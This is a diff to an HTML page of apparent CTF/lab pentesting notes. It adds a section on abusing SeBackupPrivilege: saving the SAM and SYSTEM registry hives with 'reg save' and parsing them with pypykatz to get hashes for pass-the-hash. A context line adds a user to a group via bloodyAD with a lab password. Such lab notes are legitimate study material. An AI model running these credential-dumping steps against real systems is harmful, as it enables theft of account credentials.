@@ -97,6 +97,17 @@
                         <pre><code class="language-bash">bloodyAD -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS p.agila</code></pre>
                     </ul>
                 </div>
+
+                <div class="notion-body">
+                    <h2 id="Sudo & SUID">SeBackupPrivilege</h2>
+                    <ul>
+                        <p>In case you found that your user hash admincount = 1 and SeBackupPrivilege enabled (whoami /priv) you can extrac the password hashes with the following commands</p>
+                        <pre><code class="language-powershell">reg  save hklm\sam C:\Users\emily.oscars.CICADA\Documents\sam.hive
+reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.hive</code></pre>
+                        <p>Then extract the file with download utility and use pypkatz to view the hashses and perform a pass the hash attack</p>
+                        <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive</code></pre>    
+                    </ul>
+                </div>
         </div>
     </div>
 </body>
